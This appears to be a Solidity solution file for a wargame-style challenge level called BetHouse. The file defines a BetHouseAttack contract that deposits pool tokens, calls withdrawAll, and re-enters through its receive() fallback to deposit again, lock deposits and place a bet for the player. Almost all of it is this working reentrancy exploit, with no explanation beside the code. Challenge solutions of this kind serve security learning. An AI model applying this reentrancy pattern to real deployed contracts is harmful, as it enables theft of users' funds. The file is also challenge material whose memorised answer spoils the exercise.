// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {BetHouse, Pool, PoolToken} from "../levels/BetHouse.sol";

contract BetHouseAttack {
    BetHouse public betHouse;
    address private player;
    constructor(BetHouse _betHouse, address _player){
        betHouse = _betHouse;
        player = _player;
    }
    function attack() payable external {
        require(msg.value == 0.001 ether, "Invalid value");

        Pool pool = Pool(betHouse.pool());
        PoolToken depositToken = PoolToken(pool.depositToken());
        require(depositToken.balanceOf(address(this)) == 5, "Invalid deposit token amount");
        depositToken.approve(address(pool), type(uint256).max);
        pool.deposit{value: 0.001 ether}(5);

        pool.withdrawAll();
    }
    receive() external payable {
        Pool pool = Pool(betHouse.pool());
        pool.deposit(5);
        pool.lockDeposits();
        betHouse.makeBet(player);
    }
}
